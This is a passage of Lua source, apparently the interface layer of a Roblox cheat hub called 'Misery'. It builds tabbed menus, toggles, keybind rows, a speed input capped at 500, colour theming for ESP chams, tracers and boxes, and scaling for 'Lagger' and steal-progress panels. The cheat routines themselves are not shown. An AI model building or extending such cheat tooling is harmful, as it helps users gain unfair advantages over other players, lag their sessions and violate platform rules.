    local accentSeq = api.strokeSequence(selectedColor)
    for _, grad in ipairs(api.gradients) do
        if grad.Parent then pcall(function() grad.Color = accentSeq end) end
    end
    -- Bolinhas (knobs) dos toggles seguem a cor da paleta
    for _, knob in ipairs(api.knobs) do
        if knob.Parent then
            pcall(function()
                TweenService:Create(knob, tweenInfo, {BackgroundColor3 = selectedColor}):Play()
            end)
        end
    end
    -- Texto do discord (head label) segue a cor da paleta mantendo degradê e fade out suave
    for _, tag in ipairs(api.tags) do
        if tag.Parent then
            pcall(function()
                local grad = tag:FindFirstChild("BlastHeadGrad")
                if grad then
                    grad.Color = ColorSequence.new({
                        ColorSequenceKeypoint.new(0, selectedColor),
                        ColorSequenceKeypoint.new(0.65, selectedColor:Lerp(Color3.fromRGB(255, 255, 255), 0.5)),
                        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255)),
                    })
                else
                    TweenService:Create(tag, tweenInfo, {TextColor3 = selectedColor}):Play()
                end
            end)
        end
    end
    -- ESP (chams, tracer, boxes e contorno do avatar) segue a cor da paleta
    pcall(function()
        local espFill = selectedColor:Lerp(Color3.new(0, 0, 0), 0.4)
        for _, obj in pairs(ESP.Objects) do
            if type(obj) == "table" then
                if obj.highlight then
                    pcall(function()
                        obj.highlight.FillColor = espFill
                        obj.highlight.OutlineColor = selectedColor
                    end)
                end
                if obj.line then pcall(function() obj.line.Color = selectedColor end) end
                if obj.boxLines then
                    for _, bl in ipairs(obj.boxLines) do
                        pcall(function() bl.Color = selectedColor end)
                    end
                end
                if obj.boxFrame then
                    local st = obj.boxFrame:FindFirstChildOfClass("UIStroke")
                    if st then st.Color = selectedColor end
                end
                if obj.avatarStroke then obj.avatarStroke.Color = selectedColor end
            end
        end
    end)
    -- Mobile buttons acompanham a cor da background (respeitando o toggle)
    -- e o contorno deles segue a cor da paleta
    for _, buttonData in pairs(mobileButtons) do
        local button = buttonData and buttonData.btn
        local picture = button and button:FindFirstChild("BackgroundPicture")
        if picture then
            pcall(function()
                TweenService:Create(picture, tweenInfo, {ImageColor3 = bgTint}):Play()
            end)
        end
        local mStroke = button and button:FindFirstChildOfClass("UIStroke")
        if mStroke then
            local stOn = button:GetAttribute("MiseryMobileVisualState") == "on"
            pcall(function()
                TweenService:Create(mStroke, tweenInfo, {
                    Color = stOn and selectedColor or selectedColor:Lerp(Color3.new(0, 0, 0), 0.62),
                }):Play()
            end)
        end
    end
    if not noSave then task.spawn(saveConfig) end
end

-- Constroi a paleta de cores e o toggle "Background Color" na aba VISUAL.
-- Encapsulado em funcao (locals internos nao contam no chunk principal)
function State.colorApi.buildUi(tabVis, LO, C, mkCorner, mkStroke, makeToggleRow)
    local api = State.colorApi
    local colorRow = Instance.new("Frame", tabVis)
    colorRow.Name = "BackgroundColorPalette"
    colorRow.Size = UDim2.new(1, 0, 0, 30)
    colorRow.BackgroundColor3 = C.card
    colorRow.BackgroundTransparency = 0.3
    colorRow.BorderSizePixel = 0
    colorRow.LayoutOrder = LO()
    colorRow.ZIndex = 7
    mkCorner(colorRow, 9)
    mkStroke(colorRow, C.border, 1.15, 0.38)

    local colorList = Instance.new("UIListLayout", colorRow)
    colorList.FillDirection = Enum.FillDirection.Horizontal
    colorList.HorizontalAlignment = Enum.HorizontalAlignment.Center
    colorList.VerticalAlignment = Enum.VerticalAlignment.Center
    colorList.SortOrder = Enum.SortOrder.LayoutOrder
    colorList.Padding = UDim.new(0, 6)

    local swatchStrokes = {}
    local function refreshSwatches()
        for name, stroke in pairs(swatchStrokes) do
            local selected = name == State.backgroundColor
            stroke.Color = Color3.fromRGB(255, 255, 255)
            stroke.Transparency = selected and 0 or 0.5
            stroke.Thickness = selected and 2 or 1
        end
    end

    for index, entry in ipairs(api.COLORS) do
        local colorName = entry.name
        local swatch = Instance.new("TextButton", colorRow)
        swatch.Name = colorName
        swatch.Size = UDim2.new(0, 30, 0, 12)
        swatch.BackgroundColor3 = entry.color
        swatch.BorderSizePixel = 0
        swatch.Text = ""
        swatch.AutoButtonColor = false
        swatch.LayoutOrder = index
        swatch.ZIndex = 8
        mkCorner(swatch, 4)
        local stroke = Instance.new("UIStroke", swatch)
        stroke.Color = Color3.fromRGB(255, 255, 255)
        stroke.Transparency = 0.5
        stroke.Thickness = 1
        stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
        swatchStrokes[colorName] = stroke
        swatch.MouseButton1Click:Connect(function()
            State.backgroundColor = colorName
            if colorName == "NONE" then
                State.backgroundColorEnabled = false
            end
            api.apply()
            refreshSwatches()
        end)
    end
    refreshSwatches()

    -- Toggle: controla apenas se o BACKGROUND muda de cor ou nao;
    -- o texto MISERY muda sempre pela paleta (aparte)
    makeToggleRow("Background Color", State.backgroundColorEnabled, function(on, isSync)
        State.backgroundColorEnabled = on
        if not isSync then api.apply() end
    end, nil, tabVis)

    -- Aplica os tints salvos no config ao iniciar (logo MISERY sempre, background se ligado)
    api.apply(true)
end

_G.BlastApplyLaggerScale = function()
    local gui
    pcall(function() gui = game:GetService("CoreGui"):FindFirstChild("BlastLagg_UI") end)
    if not gui then
        local pg = LP:FindFirstChild("PlayerGui")
        gui = pg and pg:FindFirstChild("BlastLagg_UI")
    end
    if not gui then return end
    local main = gui:FindFirstChild("MainFrame") or gui:FindFirstChildWhichIsA("Frame")
    if not main then return end
    local scale = main:FindFirstChild("MiseryLaggerScale")
    if not scale then
        scale = Instance.new("UIScale")
        scale.Name = "MiseryLaggerScale"
        scale.Parent = main
    end
    scale.Scale = math.clamp(tonumber(State.laggerUiScale) or 1, 0.50, 1.50)
end

local function applyMiseryProgressBarScale()
    local bar = StealProgressBar and StealProgressBar.pbFrame
    if not bar or not bar.Parent then return end
    local scale = bar:FindFirstChild("MiseryProgressBarScale")
    if not scale then
        scale = Instance.new("UIScale")
        scale.Name = "MiseryProgressBarScale"
        scale.Parent = bar
    end
    scale.Scale = math.clamp(tonumber(State.progressBarScale) or 1, 0.50, 1.50)
    StealProgressBar._uiScale = scale
end

local function createMainWindow()
    mainOuter = Instance.new("Frame", gui)
    mainOuter.Name = "MainOuter"
    mainOuter.Size = UDim2.new(0, WIN_W, 0, WIN_H)
    mainOuter.Position = _G.BlastConfigToPosition(State.guiPosition, UDim2.new(0, 8, 0, 8))
    mainOuter.BackgroundColor3 = C.bg
    mainOuter.BackgroundTransparency = 0
    mainOuter.BorderSizePixel = 0
    mainOuter.ClipsDescendants = true
    mkCorner(mainOuter, 14)
    mkStroke(mainOuter, C.border, 1.1, 0.35)
    makeDraggable(mainOuter, nil, false, "guiPosition")

    mainUiScale = Instance.new("UIScale", mainOuter)
    mainUiScale.Name = "MiseryMainScale"
    mainUiScale.Scale = math.clamp(tonumber(State.uiScale) or DEFAULT_GUI_SCALE, 0.50, 1.50)

    bgImage = Instance.new("ImageLabel", mainOuter)
    bgImage.Name = "BGImage"
    bgImage.Size = UDim2.new(1, 0, 1, 0)
    bgImage.Position = UDim2.new(0, 0, 0, 0)
    bgImage.BackgroundTransparency = 1
    bgImage.Image = ""
    bgImage.Visible = false
    bgImage.ScaleType = Enum.ScaleType.Crop
    bgImage.ZIndex = 1
    mkCorner(bgImage, 14)
    applyMiseryBackground(State.currentBackground, true)

    -- Header
    local headerFrame = Instance.new("Frame", mainOuter)
    headerFrame.Size = UDim2.new(1, 0, 0, 96)
    headerFrame.BackgroundTransparency = 1
    headerFrame.ZIndex = 5

    -- Logo grande (igual ao XZZ DUELS), com a imagem da Misery
    logoImg = Instance.new("ImageLabel", headerFrame)
    logoImg.Name = "Title"
    logoImg.BackgroundTransparency = 1
    logoImg.Image = "rbxassetid://129738961077597"
    logoImg.ScaleType = Enum.ScaleType.Fit
    logoImg.Size = UDim2.new(1, 0, 1, 0)
    logoImg.Position = UDim2.new(0, 0, 0, 0)
    logoImg.ZIndex = 6
    logoImg.ImageColor3 = Color3.fromRGB(255, 255, 255)

    -- Divisor do header (linha igual ao XZZ DUELS)
    local headerDivider = Instance.new("Frame", mainOuter)
    headerDivider.BackgroundColor3 = C.border
    headerDivider.BackgroundTransparency = 0.5
    headerDivider.BorderSizePixel = 0
    headerDivider.Size = UDim2.new(1, -34, 0, 1)
    headerDivider.Position = UDim2.new(0, 17, 0, 96)
    headerDivider.ZIndex = 6

    local minimizeBtn = Instance.new("TextButton", mainOuter)
    minimizeBtn.Size = UDim2.new(0, 32, 0, 28)
    minimizeBtn.Position = UDim2.new(1, -42, 0, 14)
    minimizeBtn.BackgroundColor3 = C.bg
    minimizeBtn.BackgroundTransparency = 0.28
    minimizeBtn.BorderSizePixel = 0
    minimizeBtn.Text = "-"
    minimizeBtn.TextColor3 = C.text
    minimizeBtn.Font = Enum.Font.GothamSemibold
    minimizeBtn.TextSize = 22
    minimizeBtn.ZIndex = 10
    mkCorner(minimizeBtn, 8)
    mkStroke(minimizeBtn, C.border, 1, 0.35)

    -- Mini button for restoring
    -- Botao flutuante de restaurar estilo Adapt UI (pill escura com o logo dentro)
    miniBtn = Instance.new("ImageButton", gui)
    miniBtn.Size = UDim2.new(0, 110, 0, 32)
    miniBtn.Position = _G.BlastConfigToPosition(State.miniGuiPosition, UDim2.new(1, -124, 0, 28))
    miniBtn.BackgroundColor3 = Color3.fromRGB(45, 28, 20)
    miniBtn.BackgroundTransparency = 0.1
    miniBtn.Image = "rbxassetid://129738961077597"
    miniBtn.ScaleType = Enum.ScaleType.Fit
    miniBtn.ImageColor3 = Color3.fromRGB(235, 35, 45)
    miniBtn.AutoButtonColor = false
    
    return minimizeBtn
end

local minimizeBtn = createMainWindow()
miniBtn.BorderSizePixel = 0
miniBtn.ZIndex = 20
miniBtn.Visible = false
mkCorner(miniBtn, 8)
mkStroke(miniBtn, C.text, 1, 0.45) -- stroke branco igual Adapt FloatOpen (segue a paleta)
makeDraggable(miniBtn, nil, false, "miniGuiPosition")

local function showGui(noSave)
    State.guiVisible = true
    mainOuter.Visible = true
    miniBtn.Visible = false
    if not noSave then task.spawn(saveConfig) end
end

local function hideGui(noSave)
    State.guiVisible = false
    mainOuter.Visible = false
    miniBtn.Visible = true
    if not noSave then task.spawn(saveConfig) end
end

minimizeBtn.MouseButton1Click:Connect(function() hideGui(false) end)
miniBtn.MouseButton1Click:Connect(function() showGui(false) end)
if State.guiVisible == false then hideGui(true) else showGui(true) end

-- All six tabs remain visible in a fixed two-row grid; no horizontal scrolling.
local tabBar = Instance.new("Frame", mainOuter)
tabBar.Size = UDim2.new(1, -24, 0, TAB_BAR_H)
tabBar.Position = UDim2.new(0, 12, 0, HEADER_H + TAB_TOP_GAP)
tabBar.BackgroundTransparency = 1
tabBar.BorderSizePixel = 0
tabBar.ClipsDescendants = false
tabBar.ZIndex = 6

local tabLL = Instance.new("UIGridLayout", tabBar)
tabLL.FillDirection = Enum.FillDirection.Horizontal
tabLL.FillDirectionMaxCells = 3
tabLL.CellSize = UDim2.new(1 / 3, -4, 0, 31)
tabLL.CellPadding = UDim2.fromOffset(6, 6)
tabLL.HorizontalAlignment = Enum.HorizontalAlignment.Center
tabLL.VerticalAlignment = Enum.VerticalAlignment.Center
tabLL.SortOrder = Enum.SortOrder.LayoutOrder

local tabPad = Instance.new("UIPadding", tabBar)
tabPad.PaddingLeft = UDim.new(0, 0)
tabPad.PaddingRight = UDim.new(0, 0)
tabPad.PaddingTop = UDim.new(0, 0)
tabPad.PaddingBottom = UDim.new(0, 0)

do
local loCount = 0
local function LO() loCount = loCount + 1; return loCount end

local tabButtons = {}
local tabPages = {}
local activeTabName = "SPEED"

local function createTab(name, displayName)
    local btn = Instance.new("TextButton", tabBar)
    -- UIGridLayout gives every tab equal width, including SPEED and KEYBINDS.
    btn.Size = UDim2.new(1 / 3, -4, 0, 31)
    btn.Text = displayName
    btn.TextColor3 = C.textDim
    btn.TextStrokeColor3 = Color3.fromRGB(0,0,0)
    btn.TextStrokeTransparency = 0.25
    btn.TextSize = 8
    btn.TextScaled = true
    btn.TextWrapped = false
    btn.Font = Enum.Font.GothamBlack
    btn.BackgroundColor3 = C.panel
    btn.BackgroundTransparency = 0.25
    btn.BorderSizePixel = 0
    btn.AutoButtonColor = false
    btn.LayoutOrder = LO()
    local tabTextLimit = Instance.new("UITextSizeConstraint", btn)
    tabTextLimit.MinTextSize = 7
    tabTextLimit.MaxTextSize = 9
    mkCorner(btn,9)
    mkStroke(btn, C.accent, 1.25, 0.15)
    
    local page = Instance.new("ScrollingFrame", mainOuter)
    page.Name = "TabPage_" .. name
    -- Conteudo abaixo das abas (topo)
    page.Size = UDim2.new(1, -10, 1, -(CONTENT_TOP + CONTENT_BOTTOM_GAP))
    page.Position = UDim2.new(0, 5, 0, CONTENT_TOP)
    page.BackgroundTransparency = 1
    page.BorderSizePixel = 0
    page.ScrollBarThickness = 0
    page.ScrollBarImageColor3 = C.accent
    page.AutomaticCanvasSize = Enum.AutomaticSize.Y
    page.CanvasSize = UDim2.new(0, 0, 0, 0)
    page.Visible = (name == activeTabName)
    page.ZIndex = 8
    
    local pageLL = Instance.new("UIListLayout", page)
    pageLL.SortOrder = Enum.SortOrder.LayoutOrder
    pageLL.Padding = UDim.new(0, 7)
    
    local pagePad = Instance.new("UIPadding", page)
    pagePad.PaddingLeft = UDim.new(0, 10)
    pagePad.PaddingRight = UDim.new(0, 10)
    pagePad.PaddingTop = UDim.new(0, 5)
    pagePad.PaddingBottom = UDim.new(0, 15)
    
    tabButtons[name] = btn
    tabPages[name] = page
    
    btn.MouseButton1Click:Connect(function()
        activeTabName = name
        for tabName, tabBtn in pairs(tabButtons) do
            local selected = tabName == name
            tabBtn.TextColor3 = selected and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(255, 180, 120)
            tabBtn.BackgroundColor3 = selected and C.accent or Color3.fromRGB(38, 24, 18)
            tabBtn.BackgroundTransparency = selected and 0.08 or 0.30
            local st = tabBtn:FindFirstChildOfClass("UIStroke")
            if st then
                st.Color = selected and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(235, 35, 45)
                st.Transparency = selected and 0.05 or 0.25
                st.Thickness = selected and 1.4 or 1.15
            end
        end
        for tabName, tabPage in pairs(tabPages) do
            tabPage.Visible = (tabName == name)
        end
    end)
    
    return page
end

local tabSpeed = createTab("SPEED", "SPEED")
local tabCombat = createTab("COMBAT", "COMBAT")
local tabSteal = createTab("STEAL", "STEAL")
local tabMech = createTab("MECH", "MECH")
local tabVis = createTab("VISUAL", "VISUAL")
local tabKeybinds = createTab("KEYBINDS", "KEYBINDS")

-- Initialize active tab
tabButtons["SPEED"].BackgroundColor3 = C.accent
tabButtons["SPEED"].BackgroundTransparency = 0.08
tabButtons["SPEED"].TextColor3 = Color3.fromRGB(255, 255, 255)
do
    local st = tabButtons["SPEED"]:FindFirstChildOfClass("UIStroke")
    if st then st.Color = Color3.fromRGB(255, 255, 255); st.Transparency = 0.05; st.Thickness = 1.4 end
end



-- ============================================================
-- UI COMPONENT BUILDERS
-- ============================================================

local function makeSectionHeader(text, parent)
    local lbl = Instance.new("TextLabel", parent)
    lbl.Size = UDim2.new(1, -6, 0, 15)
    lbl.BackgroundTransparency = 1
    lbl.Text = text:upper()
    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    lbl.Font = Enum.Font.GothamBlack
    lbl.TextSize = 11
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.TextStrokeTransparency = 1
    lbl.TextStrokeColor3 = Color3.new(0,0,0)
    lbl.LayoutOrder = LO()
    lbl.ZIndex = 7
    return lbl
end

local function makeSpeedRow(label, getFn, setFn, parent)
    local row = Instance.new("Frame", parent)
    row.Size = UDim2.new(1, 0, 0, 34)
    row.BackgroundColor3 = C.card
    row.BackgroundTransparency = 0.6
    row.BorderSizePixel = 0
    row.LayoutOrder = LO()
    row.ZIndex = 7
    styleXzzRow(row)

    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(0.55, 0, 1, 0)
    lbl.Position = UDim2.new(0, 12, 0, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = label
    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    lbl.TextTransparency = 0
    lbl.Font = Enum.Font.GothamBlack
    lbl.TextSize = 13
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.TextStrokeTransparency = 1
    lbl.TextStrokeColor3 = Color3.new(0,0,0)
    lbl.ZIndex = 12

    local valWrap = Instance.new("Frame", row)
    valWrap.Size = UDim2.new(0, 64, 0, 26)
    valWrap.Position = UDim2.new(1, -74, 0.5, -13)
    valWrap.BackgroundColor3 = C.panel
    valWrap.BackgroundTransparency = 0.18
    valWrap.BorderSizePixel = 0
    valWrap.ZIndex = 12
    valWrap.Active = true
    mkCorner(valWrap, 7)
    mkStroke(valWrap, C.border, 1, 0.45)

    local valBox = Instance.new("TextBox", valWrap)
    valBox.Size = UDim2.new(1, -4, 1, 0)
    valBox.Position = UDim2.new(0, 2, 0, 0)
    valBox.BackgroundTransparency = 1
    valBox.Text = tostring(math.floor(tonumber(getFn()) or 0))
    valBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    valBox.PlaceholderColor3 = Color3.fromRGB(180, 180, 180)
    valBox.TextTransparency = 0
    valBox.Font = Enum.Font.GothamBlack
    valBox.TextSize = 13
    valBox.TextStrokeTransparency = 1
    valBox.ClearTextOnFocus = false
    valBox.Active = true
    valBox.Selectable = true
    valBox.ZIndex = 15
    styleWhiteValueBox(valBox, valWrap)

    local function commit(n)
        n = tonumber(n)
        if not n then
            valBox.Text = tostring(math.floor(tonumber(getFn()) or 0))
            return false
        end
        n = math.clamp(n, 1, 500)
        setFn(n)
        valBox.Text = tostring(math.floor(n))
        -- Force speed loop to snap to new value immediately
        SPD.forceSpeedUntil = tick() + 0.35
        if SPD.refreshSpeedModeLabel then pcall(SPD.refreshSpeedModeLabel) end
        task.spawn(saveConfig)
        return true
    end

    valBox.FocusLost:Connect(function(enter)
        commit(valBox.Text)
    end)
    -- Live apply while typing valid numbers
    valBox:GetPropertyChangedSignal("Text"):Connect(function()
        local n = tonumber(valBox.Text)
        if n and n >= 1 and n <= 500 then
            setFn(n)
            SPD.forceSpeedUntil = tick() + 0.2
        end
    end)
    return valBox
end

local function makeKeybindRow(label, keyRef, parent)
    local row = Instance.new("Frame", parent)
    row.Size = UDim2.new(1, 0, 0, 34)
    row.BackgroundColor3 = C.card
    row.BackgroundTransparency = 0.6
    row.BorderSizePixel = 0
    row.LayoutOrder = LO()
    row.ZIndex = 7
    styleXzzRow(row)

    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(0.6, 0, 1, 0)
    lbl.Position = UDim2.new(0, 12, 0, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = label
    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    lbl.TextTransparency = 0
    lbl.Font = Enum.Font.GothamBlack
    lbl.TextSize = 13
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.TextStrokeTransparency = 1
    lbl.TextStrokeColor3 = Color3.new(0,0,0)
    lbl.ZIndex = 8

    local btn = Instance.new("TextButton", row)
    btn.Size = UDim2.new(0, 58, 0, 24)
    btn.Position = UDim2.new(1, -68, 0.5, -12)
    btn.BackgroundColor3 = C.panel
    btn.BackgroundTransparency = 0.18
    btn.BorderSizePixel = 0
    btn.AutoButtonColor = false
    btn.Active = true
    btn.Text = getKeyName(Keys[keyRef] or Enum.KeyCode.Unknown)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextTransparency = 0
    btn.Font = Enum.Font.GothamBlack
    btn.TextSize = 12
    btn.TextStrokeTransparency = 1
    btn.TextStrokeColor3 = Color3.new(0,0,0)
    btn.ZIndex = 10
    mkCorner(btn, 7)
    mkStroke(btn, C.border, 1.1, 0.28)
    keybindBtnRefs[keyRef] = btn

    btn.MouseButton1Click:Connect(function()
        -- If already listening, cancel
        if activeKeybindKeyRef == keyRef then
            cancelActiveKeybind()
            return
        end
        -- Cancel any other active listener
        cancelActiveKeybind()
        -- Start new listening
        activeKeybindBtn = btn
        activeKeybindKeyRef = keyRef
        btn.Text = "..."
        _G.EmbeerKeybinds.capture(btn, keyRef)
    end)
    return btn
end

local function makeCycleRow(label, stateKey, names, onCycle, parent)
    local row = Instance.new("TextButton", parent)
    row.Size = UDim2.new(1, 0, 0, 34)
    row.BackgroundColor3 = C.card
    row.BackgroundTransparency = 0.6
    row.BorderSizePixel = 0
    row.Text = ""
    row.AutoButtonColor = false
    row.LayoutOrder = LO()
    row.ZIndex = 7
    styleXzzRow(row)

    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(0.6, 0, 1, 0)
    lbl.Position = UDim2.new(0, 12, 0, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = label
    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    lbl.TextTransparency = 0
    lbl.Font = Enum.Font.GothamBlack
    lbl.TextSize = 13
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.TextStrokeTransparency = 1
    lbl.TextStrokeColor3 = Color3.new(0,0,0)
    lbl.ZIndex = 12

    local valText = Instance.new("TextLabel", row)
    valText.Size = UDim2.new(0.4, 0, 1, 0)
    valText.AnchorPoint = Vector2.new(1, 0.5)
    valText.Position = UDim2.new(1, -12, 0.5, 0)
    valText.BackgroundTransparency = 1
    valText.Text = names[State[stateKey]] or "Default"
    valText.TextColor3 = Color3.fromRGB(255, 255, 255)
    valText.TextTransparency = 0
    valText.Font = Enum.Font.GothamBlack
    valText.TextSize = 13
    valText.TextXAlignment = Enum.TextXAlignment.Right
    valText.TextStrokeTransparency = 1
    valText.TextStrokeColor3 = Color3.new(0,0,0)
    valText.ZIndex = 12

    row.MouseButton1Click:Connect(function()
        onCycle()
    end)
    return valText
end

local function makeToggleRow(label, defaultOn, onToggle, keyRef, parent)
    local row = Instance.new("TextButton", parent)
    row.Size = UDim2.new(1, 0, 0, 34)
    row.BackgroundColor3 = C.card
    row.BackgroundTransparency = defaultOn and 0.5 or 0.6
    row.BorderSizePixel = 0
    row.Text = ""
    row.AutoButtonColor = false
    row.LayoutOrder = LO()
    row.ZIndex = 7
    local rowStroke = styleXzzRow(row)

    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(1, -100, 1, 0)
    lbl.Position = UDim2.new(0, 12, 0, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = label
    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    lbl.TextTransparency = 0
    lbl.Font = Enum.Font.GothamBlack
    lbl.TextSize = 13
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.TextStrokeTransparency = 1
    lbl.TextStrokeColor3 = Color3.new(0,0,0)
    lbl.ZIndex = 8

    local switchBg = Instance.new("Frame", row)
    switchBg.Name = "Track"
    switchBg.Size = UDim2.new(0, 34, 0, 18)
    switchBg.Position = UDim2.new(1, -44, 0.5, -9)
    switchBg.BackgroundColor3 = defaultOn and C.pillOn or C.pillOff
    switchBg.BackgroundTransparency = defaultOn and 0.03 or 0.2
    switchBg.BorderSizePixel = 0
    switchBg.ZIndex = 8
    mkCorner(switchBg, 9)
    local switchStroke = mkStroke(switchBg, defaultOn and C.text or C.border, defaultOn and 1.25 or 1, defaultOn and 0.05 or 0.45)

    local switchDot = Instance.new("Frame", switchBg)
    switchDot.Name = "Knob"
    switchDot.Size = UDim2.new(0, 13, 0, 13)
    switchDot.Position = defaultOn and UDim2.new(1, -16, 0.5, -6) or UDim2.new(0, 3, 0.5, -6)
    switchDot.BackgroundColor3 = C.dotOn
    switchDot.BorderSizePixel = 0
    switchDot.ZIndex = 9
    mkCorner(switchDot, 999)
    -- Bolinha do toggle segue a cor da paleta
    if State.colorApi then
        switchDot.BackgroundColor3 = State.colorApi.accent
        table.insert(State.colorApi.knobs, switchDot)
    end

    local shine = Instance.new("Frame", switchDot)
    shine.BackgroundColor3 = C.text
    shine.BackgroundTransparency = 0.72
    shine.Size = UDim2.new(1, -4, 0, 4)
    shine.Position = UDim2.new(0, 2, 0, 2)
    shine.BorderSizePixel = 0
    shine.ZIndex = 10
    mkCorner(shine, 4)

    if defaultOn then
        rowStroke.Color = C.accent
        rowStroke.Transparency = 0.12
        rowStroke.Thickness = 1.25
    end

    if keyRef and Keys[keyRef] then
        local btn = Instance.new("TextButton", row)
        btn.Size = UDim2.new(0, 40, 0, 22)
        btn.Position = UDim2.new(1, -90, 0.5, -11)
        btn.BackgroundColor3 = C.panel
        btn.BackgroundTransparency = 0.18
        btn.BorderSizePixel = 0
        btn.AutoButtonColor = false
        btn.Active = true
        btn.Text = getKeyName(Keys[keyRef])
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.TextTransparency = 0
        btn.Font = Enum.Font.GothamBlack
        btn.TextSize = 12
        btn.TextStrokeTransparency = 1
        btn.TextStrokeColor3 = Color3.new(0,0,0)
        btn.ZIndex = 10
        mkCorner(btn, 7)
        mkStroke(btn, C.border, 1.1, 0.28)
        keybindBtnRefs[keyRef] = btn

        btn.MouseButton1Click:Connect(function()
            if activeKeybindKeyRef == keyRef then cancelActiveKeybind(); return end
            cancelActiveKeybind()
            activeKeybindBtn = btn
            activeKeybindKeyRef = keyRef
            btn.Text = "..."
            _G.EmbeerKeybinds.capture(btn, keyRef)
        end)
    end

    local toggled = defaultOn and true or false
    local function paint(on, noAnim)
        local dotPos = on and UDim2.new(1, -16, 0.5, -6) or UDim2.new(0, 3, 0.5, -6)
        local trackColor = on and C.pillOn or C.pillOff
        local trackTransparency = on and 0.03 or 0.2
        local strokeColor = on and C.text or C.border
        local strokeTransparency = on and 0.05 or 0.45
        local rowTransparency = on and 0.5 or 0.6
        if noAnim then
            switchDot.Position = dotPos
            switchBg.BackgroundColor3 = trackColor
            switchBg.BackgroundTransparency = trackTransparency
            switchStroke.Color = strokeColor
            switchStroke.Transparency = strokeTransparency
            switchStroke.Thickness = on and 1.25 or 1
            rowStroke.Color = on and C.accent or C.border
            rowStroke.Transparency = on and 0.08 or 0.22
            rowStroke.Thickness = on and 1.35 or 1.2
            row.BackgroundTransparency = rowTransparency
        else
            TweenService:Create(switchDot,TweenInfo.new(0.14,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Position=dotPos}):Play()
            TweenService:Create(switchBg,TweenInfo.new(0.14),{BackgroundColor3=trackColor,BackgroundTransparency=trackTransparency}):Play()
            TweenService:Create(switchStroke,TweenInfo.new(0.14),{Color=strokeColor,Transparency=strokeTransparency,Thickness=on and 1.25 or 1}):Play()
            TweenService:Create(rowStroke,TweenInfo.new(0.14),{Color=on and C.accent or C.border,Transparency=on and 0.08 or 0.22,Thickness=on and 1.35 or 1.2}):Play()
            TweenService:Create(row,TweenInfo.new(0.14),{BackgroundTransparency=rowTransparency}):Play()
        end
    end
    local function set(on, noAnim)
        toggled = on and true or false
        paint(toggled, noAnim)
        onToggle(toggled, noAnim)
    end
    row.MouseButton1Click:Connect(function() set(not toggled) end)
    return set, lbl
end
local function makeMomentaryRow(label, onTrigger, keyRef, parent)
    local row = Instance.new("TextButton", parent)
    row.Size = UDim2.new(1, 0, 0, 34)
    row.BackgroundColor3 = C.card
    row.BackgroundTransparency = 0.6
    row.BorderSizePixel = 0
    row.Text = ""
    row.AutoButtonColor = false
    row.LayoutOrder = LO()
    row.ZIndex = 7
    local rowStroke = styleXzzRow(row)

    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(1, -60, 1, 0)
    lbl.Position = UDim2.new(0, 12, 0, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = label
    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    lbl.TextTransparency = 0
    lbl.Font = Enum.Font.GothamBlack
    lbl.TextSize = 13
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.TextStrokeTransparency = 1
    lbl.TextStrokeColor3 = Color3.new(0,0,0)
    lbl.ZIndex = 8

    local switchBg = Instance.new("Frame", row)
    switchBg.Size = UDim2.new(0, 34, 0, 18)
    switchBg.Position = UDim2.new(1, -44, 0.5, -9)
    switchBg.BackgroundColor3 = C.pillOff
    switchBg.BackgroundTransparency = 0.2
    switchBg.BorderSizePixel = 0
    switchBg.ZIndex = 8
    mkCorner(switchBg, 9)
    local switchStroke = mkStroke(switchBg, C.border, 1.1, 0.28)

    local switchDot = Instance.new("Frame", switchBg)
    switchDot.Size = UDim2.new(0, 13, 0, 13)
    switchDot.Position = UDim2.new(0, 3, 0.5, -6)
    switchDot.BackgroundColor3 = C.dotOff
    switchDot.BorderSizePixel = 0
    switchDot.ZIndex = 9
    mkCorner(switchDot, 999)
    -- Bolinha segue a cor da paleta
    if State.colorApi then
        switchDot.BackgroundColor3 = State.colorApi.accent
        table.insert(State.colorApi.knobs, switchDot)
    end

    local shine = Instance.new("Frame", switchDot)
    shine.BackgroundColor3 = C.text
    shine.BackgroundTransparency = 0.72
    shine.Size = UDim2.new(1, -4, 0, 4)
    shine.Position = UDim2.new(0, 2, 0, 2)
    shine.BorderSizePixel = 0
    shine.ZIndex = 10
    mkCorner(shine, 4)

    if keyRef and Keys[keyRef] then
        local btn = Instance.new("TextButton", row)
        btn.Size = UDim2.new(0, 40, 0, 22)
        btn.Position = UDim2.new(1, -90, 0.5, -11)
        btn.BackgroundColor3 = C.panel
        btn.BackgroundTransparency = 0.18
        btn.BorderSizePixel = 0
        btn.AutoButtonColor = false
        btn.Active = true
        btn.Text = getKeyName(Keys[keyRef])
        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
        btn.TextTransparency = 0
        btn.Font = Enum.Font.GothamBlack
        btn.TextSize = 12
        btn.TextStrokeTransparency = 1
        btn.TextStrokeColor3 = Color3.new(0,0,0)
        btn.ZIndex = 10
        mkCorner(btn, 7)
